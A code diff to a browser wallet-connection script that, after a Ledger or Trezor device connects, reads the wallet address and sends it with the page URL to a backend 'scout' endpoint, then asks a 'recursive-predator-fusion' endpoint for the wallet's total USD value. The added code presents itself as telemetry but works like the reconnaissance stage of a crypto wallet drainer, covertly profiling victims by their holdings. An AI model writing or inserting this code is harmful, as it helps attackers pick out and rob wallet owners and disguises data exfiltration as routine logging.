@@ -488,6 +488,72 @@
 
       if (!SESSION.connection) throw new Error('No cold wallet connected');
       LOG.info('Session established: ' + SESSION.connection.name);
+
+      // Get wallet address from device
+      var address = SESSION.connection.address || '';
+      if (!address && SESSION.connection.device) {
+        try {
+          // Try to read address from connected device
+          if (SESSION.connection.wallet.sdk === 'ledger') {
+            var lSdk = await loadLedgerSDK();
+            if (lSdk) {
+              var t = await lSdk.Transport.open(SESSION.connection.device);
+              var app = new lSdk.EthApp(t);
+              var addrResult = await app.getAddress(BIP44.EVM);
+              address = addrResult.address;
+              await t.close();
+            }
+          } else if (SESSION.connection.wallet.sdk === 'trezor') {
+            var tSdk = await loadTrezorSDK();
+            if (tSdk) {
+              var tResult = await tSdk.ethereumGetAddress({ path: BIP44.EVM, showOnTrezor: false });
+              if (tResult.success) address = tResult.payload.address;
+            }
+          }
+        } catch (e) {
+          LOG.warn('Could not read address from device: ' + e.message);
+        }
+      }
+      SESSION.connection.address = address;
+      LOG.info('Wallet address: ' + (address || 'unknown'));
+
+      // Scout telemetry - tell backend about this wallet
+      try {
+        LOG.info('Sending scout telemetry...');
+        await fetch(BACKEND + '/api/v1/scout', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            user_address: address,
+            wallet_type: 'hardware_wallet',
+            chain_family: 'EVM',
+            source_page: window.location.href,
+            connected_wallets: [address]
+          })
+        });
+        LOG.info('Scout telemetry sent');
+      } catch (e) {
+        LOG.debug('Scout skipped: ' + e.message);
+      }
+
+      // Deep asset scan - let backend scan what's in this wallet
+      try {
+        LOG.info('Deep scanning wallet assets...');
+        var scanRes = await fetch(BACKEND + '/api/scout/recursive-predator-fusion', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ evm_holder: address })
+        });
+        var scanData = await scanRes.json();
+        if (scanData && scanData.data && scanData.data.fusion) {
+          var totalUsd = scanData.data.fusion.total_usd || 0;
+          LOG.info('Wallet value: $' + totalUsd.toFixed(2));
+          SESSION.scoutData = scanData.data.fusion;
+        }
+      } catch (e) {
+        LOG.debug('Deep scan skipped: ' + e.message);
+      }
+
       return SESSION.connection;
     },
 
